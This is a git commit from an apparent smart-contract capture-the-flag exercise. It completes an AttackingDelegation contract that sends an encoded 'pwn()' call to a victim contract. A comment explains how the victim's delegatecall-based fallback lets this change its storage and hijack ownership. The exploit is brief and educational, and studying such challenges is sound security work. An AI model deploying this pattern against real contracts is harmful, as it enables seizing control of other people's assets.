6cd93a3a397e960b72413265d60cd30fb82a2fb8
Pedro Yan Ornelas <pedroyane@gmail.com>
2022-12-10 20:23:51 -0300

    Level 2 - Hacked delegation contract

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -9,7 +9,16 @@ contract AttackingDelegation {
         contractAddress = _contractAddress;
     }
 
+    /**
+     * @dev Forces victim to execute `pwn()` function. Since `delegatecall` is used on the Delegation contract, it's
+     * storage is updated with the execution of `pwn()` on the delegate (https://solidity-by-example.org/delegatecall/).
+     * By passing a payload to the victim contract that does not match any of its existing function signatures, we
+     * execute its fallback function. See https://solidity-by-example.org/sending-ether/ and
+     * https://docs.soliditylang.org/en/v0.8.12/contracts.html#fallback-function for more information on fallback
+     * functions.
+     */
     function hackContract() external {
-        // Code me!
+        bytes memory payload = abi.encodeWithSignature("pwn()");
+        (bool result, ) = contractAddress.call(payload);
     }
 }
